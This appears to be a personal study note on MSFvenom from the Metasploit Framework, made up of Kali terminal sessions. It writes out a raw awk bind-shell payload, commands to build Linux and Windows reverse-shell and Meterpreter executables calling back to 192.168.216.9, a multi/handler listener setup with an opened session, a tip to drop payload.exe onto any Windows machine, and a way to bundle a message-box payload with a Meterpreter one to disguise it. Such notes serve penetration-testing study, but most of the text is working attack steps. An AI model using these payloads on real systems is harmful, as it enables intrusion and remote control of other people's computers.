MSFvenom is the tool to use for payload generation and encoding and it is an evolution of `msfpayload` and `msfencode`.
This is a tool in the Metasploit Framework that is used to generate payloads for exploiting vulnerabilities.
## Payloads and payload options

#### Displaying the help menu for MSFvenom
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -h 
```

#### Displaying all the payloads available in metasploit
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -l payloads            

Framework Payloads (968 total) [--payload <value>]
```

#### Generating a payload
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -p cmd/unix/bind_awk -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 140 bytes
awk 'BEGIN{s="/inet/tcp/4444/0/0";do{if((s|&getline c)<=0)break;if(c){while((c|&getline)>0)print $0|&s;close(c)}} while(c!="exit")close(s)}'
```
- To generate a payload, we always need to use at least two options, `-p` and `-f`.
- `-p` --> It is used to specify the required payload that we want to generate from availables payloads.
- Above a bind shell via GNU AWK.
- `-f` --> It is used to spacify the output format.

#### Listing all the output formats
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom --list formats
```
- There are two types of formats in msfvenom, executable and transform
- Executable formats will generate programs and scripts, while transform formats will just produce the payload.

#### Spacifying a custom payload
```python
┌──(root㉿kali)-[/home/hyok]
└─# cat custom.raw | msfvenom -p - -a x64 --platform linux -f elf -o custom.elf
```
1.  `cat custom.raw` - This command is used to display the contents of the file `custom.raw` on the terminal.
2. `|` - This is a pipe symbol that is used to redirect the output of the previous command to the input of the next command.
3. `msfvenom` - This is a tool in the Metasploit Framework that is used to generate payloads for exploiting vulnerabilities.
4. `-p -` - This option tells msfvenom to read the payload from standard input rather than from a file.
5. `-a x64` - This option specifies the target architecture of the payload as x64.
6. `--platform linux` - This option specifies the target platform as Linux.
7. `-f elf` - This option specifies the output format of the payload as an ELF file, which is a common format used on Linux systems.
8. `-o custom.elf` - This option specifies the output filename as `custom.elf`.

#### Listing all the available platforms
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom --list platforms
```

#### Generating the smallest possible payload 
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -p linux/x64/shell_bind_tcp -f elf --smallest -o small.elf 
```
- The `--smallest` option, which we can use to generate the smallest possible payload.

##### Setting the execution permission for the payload
```python
┌──(root㉿kali)-[/home/hyok]
└─# chmod +x small.elf       
┌──(root㉿kali)-[/home/hyok]
└─# ./small.elf   
```

##### Connecting to the bind shell which we form previously
```python
┌──(root㉿kali)-[/home/hyok]
└─# nc 127.0.0.1 4444
hostname
kali
```

## Creating a linux payload
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.216.9 LPORT=1234 -f elf -o reverse.elf
```

#### Listing the payload options
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom --list-options -p linux/x64/shell_reverse_tcp
```

#### Setting up our listener
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfconsole -q                                         
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/shell/reverse_tcp
PAYLOAD => linux/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.216.9
LHOST => 192.168.216.9
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.216.9:1234 
```

#### Setting the execution permission using the `chmod` command, and then run the payload
```python
┌──(root㉿kali)-[/home/hyok]
└─# chmod +x reverse.elf                                         
                                                                          
┌──(root㉿kali)-[/home/hyok]
└─# ./reverse.elf 
```

#### We have a session
```python
[*] Sending stage (38 bytes) to 192.168.216.9
[*] Command shell session 1 opened (192.168.216.9:1234 -> 192.168.216.9:36034) at 2023-04-07 14:53:57 +0530
```

## Creating a Windows payload
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.9 -f exe -o payload.exe
```

#### Setting up the listener for the above payload
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfconsole -q                                                                                                  
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.216.9
LHOST => 192.168.216.9
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.216.9:4444 
```
Note - Drop your payload.exe to any windows machine and then you get a session.

## Creating a payload that pop up a message on target and give us session

#### First we will create a simple payload which is just pop up a message on target system
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="Welcome" -f raw > payload                  
No encoder specified, outputting raw payload
Payload size: 267 bytes
```

#### Adding the features of `payload` to our new `npayload`
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfvenom -c payload -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.9 -f exe -o npayload    
Adding shellcode from payload to the payload
No encoder specified, outputting raw payload
Payload size: 940 bytes
Final size of exe file: 73802 bytes
Saved as: npayload
```

#### Result of execution of payload
![[messageBox.jpeg]]
